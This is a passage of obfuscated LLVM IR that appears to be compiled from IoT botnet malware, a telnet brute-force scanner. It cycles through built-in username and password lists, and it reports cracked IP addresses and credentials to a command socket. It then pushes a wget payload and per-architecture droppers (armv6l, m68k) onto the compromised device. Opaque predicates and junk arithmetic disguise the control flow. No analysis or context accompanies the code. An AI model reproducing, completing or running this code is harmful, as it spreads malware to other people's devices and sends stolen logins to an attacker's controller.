  %1808 = urem i32 %1807, 2
  %1809 = icmp eq i32 %1808, 0
  %1810 = icmp slt i32 %1805, 10
  %1811 = or i1 %1809, %1810
  br i1 %1811, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %1803
  %1812 = load i32, i32* @x.71
  %1813 = load i32, i32* @y.72
  %1814 = sub i32 %1812, 1
  %1815 = mul i32 %1812, %1814
  %1816 = urem i32 %1815, 2
  %1817 = icmp eq i32 %1816, 0
  %1818 = icmp slt i32 %1813, 10
  %1819 = or i1 %1817, %1818
  br i1 %1819, label %originalBBpart2205, label %originalBB203alteredBB

originalBBpart2205:                               ; preds = %originalBB203
  br label %1820

; <label>:1820:                                   ; preds = %originalBBpart2205
  br label %1821

; <label>:1821:                                   ; preds = %1820
  br label %1822

; <label>:1822:                                   ; preds = %1821
  br label %1823

; <label>:1823:                                   ; preds = %1822
  %1824 = load i32, i32* @x.71
  %1825 = load i32, i32* @y.72
  %1826 = sub i32 %1824, 1
  %1827 = mul i32 %1824, %1826
  %1828 = urem i32 %1827, 2
  %1829 = icmp eq i32 %1828, 0
  %1830 = icmp slt i32 %1825, 10
  %1831 = or i1 %1829, %1830
  br i1 %1831, label %originalBB207, label %originalBB207alteredBB

originalBB207:                                    ; preds = %originalBB207alteredBB, %1823
  %1832 = load i32, i32* @x.71
  %1833 = load i32, i32* @y.72
  %1834 = sub i32 %1832, 1
  %1835 = mul i32 %1832, %1834
  %1836 = urem i32 %1835, 2
  %1837 = icmp eq i32 %1836, 0
  %1838 = icmp slt i32 %1833, 10
  %1839 = or i1 %1837, %1838
  br i1 %1839, label %originalBBpart2209, label %originalBB207alteredBB

originalBBpart2209:                               ; preds = %originalBB207
  br label %1840

; <label>:1840:                                   ; preds = %originalBBpart2209
  %1841 = load i32, i32* @x.71
  %1842 = load i32, i32* @y.72
  %1843 = sub i32 %1841, 1
  %1844 = mul i32 %1841, %1843
  %1845 = urem i32 %1844, 2
  %1846 = icmp eq i32 %1845, 0
  %1847 = icmp slt i32 %1842, 10
  %1848 = or i1 %1846, %1847
  br i1 %1848, label %originalBB211, label %originalBB211alteredBB

originalBB211:                                    ; preds = %originalBB211alteredBB, %1840
  %1849 = load i32, i32* @x.71
  %1850 = load i32, i32* @y.72
  %1851 = sub i32 %1849, 1
  %1852 = mul i32 %1849, %1851
  %1853 = urem i32 %1852, 2
  %1854 = icmp eq i32 %1853, 0
  %1855 = icmp slt i32 %1850, 10
  %1856 = or i1 %1854, %1855
  br i1 %1856, label %originalBBpart2213, label %originalBB211alteredBB

originalBBpart2213:                               ; preds = %originalBB211
  br label %1857

; <label>:1857:                                   ; preds = %originalBBpart2213
  br label %1858

; <label>:1858:                                   ; preds = %1857
  %1859 = call i32 @sleep(i32 1)
  br label %1860

; <label>:1860:                                   ; preds = %1858, %1719, %originalBBpart2189, %originalBBpart2185, %1637, %1621, %1589, %1573, %originalBBpart2177, %1525, %1493, %1477, %originalBBpart2169, %1429
  %1861 = load i32, i32* %29, align 4
  %1862 = add nsw i32 %1861, 1
  store i32 %1862, i32* %29, align 4
  br label %1398

; <label>:1863:                                   ; preds = %originalBBpart2165
  %1864 = load i32, i32* %6, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1865
  call void @advance_telstate(%struct.telstate_t* %1866, i32 16)
  br label %1913

; <label>:1867:                                   ; preds = %originalBBpart218
  %1868 = load i32, i32* @x.71
  %1869 = load i32, i32* @y.72
  %1870 = sub i32 %1868, 1
  %1871 = mul i32 %1868, %1870
  %1872 = urem i32 %1871, 2
  %1873 = icmp eq i32 %1872, 0
  %1874 = icmp slt i32 %1869, 10
  %1875 = or i1 %1873, %1874
  br i1 %1875, label %originalBB215, label %originalBB215alteredBB

originalBB215:                                    ; preds = %originalBB215alteredBB, %1867
  %1876 = load i32, i32* @mainCommSock, align 4
  %1877 = load i32, i32* %6, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 1
  %1881 = bitcast i32* %1880 to %struct.in_addr*
  %1882 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1881, i32 0, i32 0
  %1883 = load i32, i32* %1882, align 4
  %1884 = call i8* @inet_ntoa(i32 %1883) #5
  %1885 = load i32, i32* %6, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 4
  %1889 = load i8, i8* %1888, align 2
  %1890 = zext i8 %1889 to i64
  %1891 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1890
  %1892 = load i8*, i8** %1891, align 8
  %1893 = load i32, i32* %6, align 4
  %1894 = sext i32 %1893 to i64
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1894
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1895, i32 0, i32 5
  %1897 = load i8, i8* %1896, align 1
  %1898 = zext i8 %1897 to i64
  %1899 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1898
  %1900 = load i8*, i8** %1899, align 8
  %1901 = call i32 (i32, i8*, ...) @sockprintf(i32 %1876, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.289, i32 0, i32 0), i8* %1884, i8* %1892, i8* %1900)
  %1902 = load i32, i32* %6, align 4
  %1903 = sext i32 %1902 to i64
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1903
  call void @reset_telstate(%struct.telstate_t* %1904)
  %1905 = load i32, i32* @x.71
  %1906 = load i32, i32* @y.72
  %1907 = sub i32 %1905, 1
  %1908 = mul i32 %1905, %1907
  %1909 = urem i32 %1908, 2
  %1910 = icmp eq i32 %1909, 0
  %1911 = icmp slt i32 %1906, 10
  %1912 = or i1 %1910, %1911
  br i1 %1912, label %originalBBpart2217, label %originalBB215alteredBB

originalBBpart2217:                               ; preds = %originalBB215
  br label %1913

; <label>:1913:                                   ; preds = %originalBBpart2217, %1863, %1367, %1322, %1264, %originalBBpart2153, %1154, %1085, %1069, %989, %976, %originalBBpart2110, %788, %717, %664, %originalBBpart271, %397, %originalBBpart218
  br label %1914

; <label>:1914:                                   ; preds = %1913, %1363, %1318, %1163, %1081, %985, %945, %originalBBpart2106, %773, %originalBBpart298, %633, %529, %originalBBpart263, %330, %originalBBpart231, %238
  %1915 = load i32, i32* %6, align 4
  %1916 = add nsw i32 %1915, 1
  store i32 %1916, i32* %6, align 4
  br label %125

; <label>:1917:                                   ; preds = %125
  br label %123
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %35
  %1919 = load i32, i32* %4, align 4
  store i32 %1919, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  %1920 = load i32, i32* %6, align 4
  %1921 = sext i32 %1920 to i64
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1921
  %1923 = bitcast %struct.telstate_t* %1922 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1923, i8 0, i64 32, i32 16, i1 false)
  %1924 = load i32, i32* %6, align 4
  %1925 = sext i32 %1924 to i64
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1925
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1926, i32 0, i32 3
  store i8 1, i8* %1927, align 1
  %1928 = load i8*, i8** %17, align 8
  %1929 = load i32, i32* %6, align 4
  %1930 = sext i32 %1929 to i64
  %1931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1930
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1931, i32 0, i32 9
  store i8* %1928, i8** %1932, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  %1933 = load i32, i32* %6, align 4
  %_ = shl i32 %1933, 1
  %_7 = sub i32 %1933, 1
  %gen = mul i32 %_7, 1
  %_8 = shl i32 %1933, 1
  %_9 = shl i32 %1933, 1
  %_10 = sub i32 0, %1933
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %1933, 1
  %1934 = add nsw i32 %1933, 1
  store i32 %1934, i32* %6, align 4
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %143
  %1935 = load i32, i32* %6, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1936
  %1938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1937, i32 0, i32 2
  %1939 = load i8, i8* %1938, align 8
  %1940 = zext i8 %1939 to i32
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %194
  %1941 = load i32, i32* %6, align 4
  %1942 = sext i32 %1941 to i64
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1942
  %1944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1943, i32 0, i32 3
  %1945 = load i8, i8* %1944, align 1
  %1946 = zext i8 %1945 to i32
  %1947 = icmp eq i32 %1946, 0
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %243
  %1948 = load i32, i32* %6, align 4
  %1949 = sext i32 %1948 to i64
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1949
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1950, i32 0, i32 4
  %1952 = load i8, i8* %1951, align 2
  %1953 = zext i8 %1952 to i64
  %1954 = icmp eq i64 %1953, 19
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %267
  %1955 = load i32, i32* %6, align 4
  %1956 = sext i32 %1955 to i64
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1956
  %1958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1957, i32 0, i32 3
  store i8 1, i8* %1958, align 1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %289
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %331
  %1959 = load i32, i32* %6, align 4
  %1960 = sext i32 %1959 to i64
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1960
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1961, i32 0, i32 0
  %1963 = load i32, i32* %1962, align 16
  %1964 = load i32, i32* %6, align 4
  %1965 = sext i32 %1964 to i64
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1965
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1966, i32 0, i32 0
  %1968 = load i32, i32* %1967, align 16
  %1969 = call i32 (i32, i32, ...) @fcntl(i32 %1968, i32 3, i8* null)
  %_38 = sub i32 %1969, 2048
  %gen39 = mul i32 %_38, 2048
  %_40 = sub i32 %1969, 2048
  %gen41 = mul i32 %_40, 2048
  %_42 = sub i32 %1969, 2048
  %gen43 = mul i32 %_42, 2048
  %_44 = sub i32 0, %1969
  %gen45 = add i32 %_44, 2048
  %_46 = shl i32 %1969, 2048
  %1970 = or i32 %1969, 2048
  %1971 = call i32 (i32, i32, ...) @fcntl(i32 %1963, i32 4, i32 %1970)
  %1972 = load i32, i32* %6, align 4
  %1973 = sext i32 %1972 to i64
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1973
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1974, i32 0, i32 0
  %1976 = load i32, i32* %1975, align 16
  %1977 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %1978 = call i32 @connect(i32 %1976, %struct.sockaddr* %1977, i32 16)
  %1979 = icmp eq i32 %1978, -1
  br label %originalBB37

originalBB50alteredBB:                            ; preds = %originalBB50, %377
  %1980 = load i32, i32* %6, align 4
  %1981 = sext i32 %1980 to i64
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1981
  call void @advance_telstate(%struct.telstate_t* %1982, i32 1)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %460
  %1983 = load i32, i32* %6, align 4
  %1984 = sext i32 %1983 to i64
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1984
  %1986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1985, i32 0, i32 0
  %1987 = load i32, i32* %1986, align 16
  %1988 = load i32, i32* %6, align 4
  %1989 = sext i32 %1988 to i64
  %1990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1989
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1990, i32 0, i32 0
  %1992 = load i32, i32* %1991, align 16
  %1993 = call i32 (i32, i32, ...) @fcntl(i32 %1992, i32 3, i8* null)
  %_55 = shl i32 %1993, -2049
  %_56 = shl i32 %1993, -2049
  %_57 = shl i32 %1993, -2049
  %1994 = and i32 %1993, -2049
  %1995 = call i32 (i32, i32, ...) @fcntl(i32 %1987, i32 4, i32 %1994)
  %1996 = load i32, i32* %6, align 4
  %1997 = sext i32 %1996 to i64
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %1997
  call void @advance_telstate(%struct.telstate_t* %1998, i32 2)
  br label %originalBB54

originalBB61alteredBB:                            ; preds = %originalBB61, %493
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %510
  %1999 = load i32, i32* %7, align 4
  %2000 = icmp eq i32 %1999, -1
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %548
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %565
  %2001 = load i32, i32* %6, align 4
  %2002 = sext i32 %2001 to i64
  %2003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2002
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2003, i32 0, i32 0
  %2005 = load i32, i32* %2004, align 16
  %2006 = load i32, i32* %3, align 4
  %2007 = load i32, i32* %6, align 4
  %2008 = sext i32 %2007 to i64
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2008
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2009, i32 0, i32 9
  %2011 = load i8*, i8** %2010, align 8
  %2012 = call i32 @read_until_response(i32 %2005, i32 %2006, i8* %2011, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %2013 = icmp ne i32 %2012, 0
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %609
  %2014 = load i32, i32* %6, align 4
  %2015 = sext i32 %2014 to i64
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2015
  call void @advance_telstate(%struct.telstate_t* %2016, i32 0)
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %634
  %2017 = load i32, i32* %6, align 4
  %2018 = sext i32 %2017 to i64
  %2019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2018
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2019, i32 0, i32 7
  %2021 = load i32, i32* %2020, align 16
  %_82 = sub i32 %2021, 7
  %gen83 = mul i32 %_82, 7
  %_84 = sub i32 %2021, 7
  %gen85 = mul i32 %_84, 7
  %_86 = shl i32 %2021, 7
  %_87 = sub i32 0, %2021
  %gen88 = add i32 %_87, 7
  %2022 = add i32 %2021, 7
  %2023 = zext i32 %2022 to i64
  %2024 = call i64 @time(i64* null) #5
  %2025 = icmp slt i64 %2023, %2024
  br label %originalBB81

originalBB92alteredBB:                            ; preds = %originalBB92, %665
  %2026 = load i32, i32* %6, align 4
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2027
  %2029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2028, i32 0, i32 0
  %2030 = load i32, i32* %2029, align 16
  %2031 = load i32, i32* %6, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2032
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2033, i32 0, i32 4
  %2035 = load i8, i8* %2034, align 2
  %2036 = zext i8 %2035 to i64
  %2037 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %2036
  %2038 = load i8*, i8** %2037, align 8
  %2039 = call i32 (i32, i8*, ...) @sockprintf(i32 %2030, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.276, i32 0, i32 0), i8* %2038)
  %2040 = icmp slt i32 %2039, 0
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %697
  %2041 = load i32, i32* %6, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2042
  call void @reset_telstate(%struct.telstate_t* %2043)
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %735
  %2044 = call i64 @time(i64* null) #5
  %2045 = trunc i64 %2044 to i32
  %2046 = load i32, i32* %6, align 4
  %2047 = sext i32 %2046 to i64
  %2048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2047
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2048, i32 0, i32 7
  store i32 %2045, i32* %2049, align 16
  %2050 = load i32, i32* %6, align 4
  %2051 = sext i32 %2050 to i64
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2051
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2052, i32 0, i32 9
  %2054 = load i8*, i8** %2053, align 8
  %2055 = call i32 @contains_fail(i8* %2054)
  %2056 = icmp ne i32 %2055, 0
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %805
  %2057 = load i32, i32* %6, align 4
  %2058 = sext i32 %2057 to i64
  %2059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2058
  call void @reset_telstate(%struct.telstate_t* %2059)
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %825
  %2060 = load i32, i32* %6, align 4
  %2061 = sext i32 %2060 to i64
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2061
  call void @advance_telstate(%struct.telstate_t* %2062, i32 6)
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %928
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %946
  %2063 = load i32, i32* %6, align 4
  %2064 = sext i32 %2063 to i64
  %2065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2064
  %2066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2065, i32 0, i32 7
  %2067 = load i32, i32* %2066, align 16
  %_117 = sub i32 %2067, 7
  %gen118 = mul i32 %_117, 7
  %_119 = shl i32 %2067, 7
  %_120 = sub i32 0, %2067
  %gen121 = add i32 %_120, 7
  %_122 = sub i32 0, %2067
  %gen123 = add i32 %_122, 7
  %_124 = sub i32 0, %2067
  %gen125 = add i32 %_124, 7
  %_126 = sub i32 %2067, 7
  %gen127 = mul i32 %_126, 7
  %2068 = add i32 %2067, 7
  %2069 = zext i32 %2068 to i64
  %2070 = call i64 @time(i64* null) #5
  %2071 = icmp slt i64 %2069, %2070
  br label %originalBB116

originalBB131alteredBB:                           ; preds = %originalBB131, %993
  store i32 0, i32* %23, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB131

originalBB135alteredBB:                           ; preds = %originalBB135, %1010
  %2072 = load i32, i32* %23, align 4
  %2073 = icmp slt i32 %2072, 5
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %1045
  %2074 = load i32, i32* %6, align 4
  %2075 = sext i32 %2074 to i64
  %2076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2075
  call void @reset_telstate(%struct.telstate_t* %2076)
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %1089
  %2077 = load i32, i32* %6, align 4
  %2078 = sext i32 %2077 to i64
  %2079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2078
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2079, i32 0, i32 0
  %2081 = load i32, i32* %2080, align 16
  %2082 = load i32, i32* %3, align 4
  %2083 = load i32, i32* %6, align 4
  %2084 = sext i32 %2083 to i64
  %2085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2084
  %2086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2085, i32 0, i32 9
  %2087 = load i8*, i8** %2086, align 8
  %2088 = call i32 @read_until_response(i32 %2081, i32 %2082, i8* %2087, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @archs, i32 0, i32 0))
  %2089 = icmp ne i32 %2088, 0
  br label %originalBB143

originalBB147alteredBB:                           ; preds = %originalBB147, %1119
  %2090 = load i32, i32* %6, align 4
  %2091 = sext i32 %2090 to i64
  %2092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2091
  %2093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2092, i32 0, i32 9
  %2094 = load i8*, i8** %2093, align 8
  %2095 = load i8*, i8** %26, align 8
  %2096 = bitcast i8* %2095 to i8**
  %2097 = call i32 @contains_string(i8* %2094, i8** %2096)
  %2098 = icmp ne i32 %2097, 0
  br label %originalBB147

originalBB151alteredBB:                           ; preds = %originalBB151, %1167
  %2099 = load i32, i32* %6, align 4
  %2100 = sext i32 %2099 to i64
  %2101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2100
  call void @advance_telstate(%struct.telstate_t* %2101, i32 12)
  br label %originalBB151

originalBB155alteredBB:                           ; preds = %originalBB155, %1245
  br label %originalBB155

originalBB159alteredBB:                           ; preds = %originalBB159, %1265
  %2102 = load i32, i32* @mainCommSock, align 4
  %2103 = load i32, i32* %6, align 4
  %2104 = sext i32 %2103 to i64
  %2105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2104
  %2106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2105, i32 0, i32 1
  %2107 = bitcast i32* %2106 to %struct.in_addr*
  %2108 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2107, i32 0, i32 0
  %2109 = load i32, i32* %2108, align 4
  %2110 = call i8* @inet_ntoa(i32 %2109) #5
  %2111 = load i32, i32* %6, align 4
  %2112 = sext i32 %2111 to i64
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2112
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2113, i32 0, i32 4
  %2115 = load i8, i8* %2114, align 2
  %2116 = zext i8 %2115 to i64
  %2117 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %2116
  %2118 = load i8*, i8** %2117, align 8
  %2119 = load i32, i32* %6, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2120
  %2122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2121, i32 0, i32 5
  %2123 = load i8, i8* %2122, align 1
  %2124 = zext i8 %2123 to i64
  %2125 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %2124
  %2126 = load i8*, i8** %2125, align 8
  %2127 = call i32 (i32, i8*, ...) @sockprintf(i32 %2102, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.284, i32 0, i32 0), i8* %2110, i8* %2118, i8* %2126)
  %2128 = load i32, i32* %6, align 4
  %2129 = sext i32 %2128 to i64
  %2130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2129
  %2131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2130, i32 0, i32 0
  %2132 = load i32, i32* %2131, align 16
  %2133 = load i8*, i8** @wgetpayload, align 8
  %2134 = load i8*, i8** @wgetpayload, align 8
  %2135 = call i64 @strlen(i8* %2134) #9
  %2136 = call i64 @send(i32 %2132, i8* %2133, i64 %2135, i32 16384)
  %2137 = icmp slt i64 %2136, 0
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %1398
  %2138 = load i32, i32* %29, align 4
  %2139 = icmp slt i32 %2138, 1
  br label %originalBB163

originalBB167alteredBB:                           ; preds = %originalBB167, %1445
  %2140 = load i32, i32* %6, align 4
  %2141 = sext i32 %2140 to i64
  %2142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2141
  call void @reset_telstate(%struct.telstate_t* %2142)
  br label %originalBB167

originalBB171alteredBB:                           ; preds = %originalBB171, %1497
  %2143 = load i32, i32* %6, align 4
  %2144 = sext i32 %2143 to i64
  %2145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2144
  %2146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2145, i32 0, i32 0
  %2147 = load i32, i32* %2146, align 16
  %2148 = load i32, i32* %29, align 4
  %2149 = sext i32 %2148 to i64
  %2150 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv6l, i64 0, i64 %2149
  %2151 = load i8*, i8** %2150, align 8
  %2152 = call i32 (i32, i8*, ...) @sockprintf(i32 %2147, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %2151)
  %2153 = icmp slt i32 %2152, 0
  br label %originalBB171

originalBB175alteredBB:                           ; preds = %originalBB175, %1541
  %2154 = load i32, i32* %6, align 4
  %2155 = sext i32 %2154 to i64
  %2156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2155
  call void @reset_telstate(%struct.telstate_t* %2156)
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1593
  %2157 = load i32, i32* %6, align 4
  %2158 = sext i32 %2157 to i64
  %2159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2158
  %2160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2159, i32 0, i32 0
  %2161 = ptrtoint i32* %2160 to i32
  %2162 = load i32, i32* %29, align 4
  %2163 = sext i32 %2162 to i64
  %2164 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_m68k, i64 0, i64 %2163
  %2165 = load i8*, i8** %2164, align 8
  %2166 = call i32 (i32, i8*, ...) @sockprintf(i32 %2161, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %2165)
  %2167 = icmp slt i32 %2166, 0
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1653
  %2168 = load i32, i32* %6, align 4
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2169
  call void @reset_telstate(%struct.telstate_t* %2170)
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %1685
  %2171 = load i32, i32* %6, align 4
  %2172 = sext i32 %2171 to i64
  %2173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2172
  call void @reset_telstate(%struct.telstate_t* %2173)
  br label %originalBB187

originalBB191alteredBB:                           ; preds = %originalBB191, %1723
  %2174 = load i32, i32* @mainCommSock, align 4
  %2175 = load i32, i32* %6, align 4
  %2176 = sext i32 %2175 to i64
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2176
  %2178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2177, i32 0, i32 1
  %2179 = bitcast i32* %2178 to %struct.in_addr*
  %2180 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2179, i32 0, i32 0
  %2181 = load i32, i32* %2180, align 4
  %2182 = call i8* @inet_ntoa(i32 %2181) #5
  %2183 = load i32, i32* %6, align 4
  %2184 = sext i32 %2183 to i64
  %2185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2184
  %2186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2185, i32 0, i32 4
  %2187 = load i8, i8* %2186, align 2
  %2188 = zext i8 %2187 to i64
  %2189 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %2188
  %2190 = load i8*, i8** %2189, align 8
  %2191 = load i32, i32* %6, align 4
  %2192 = sext i32 %2191 to i64
  %2193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2192
  %2194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2193, i32 0, i32 5
  %2195 = load i8, i8* %2194, align 1
  %2196 = zext i8 %2195 to i64
  %2197 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %2196
  %2198 = load i8*, i8** %2197, align 8
  %2199 = call i32 (i32, i8*, ...) @sockprintf(i32 %2174, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.288, i32 0, i32 0), i8* %2182, i8* %2190, i8* %2198)
  br label %originalBB191

originalBB195alteredBB:                           ; preds = %originalBB195, %1766
  br label %originalBB195

originalBB199alteredBB:                           ; preds = %originalBB199, %1783
  br label %originalBB199

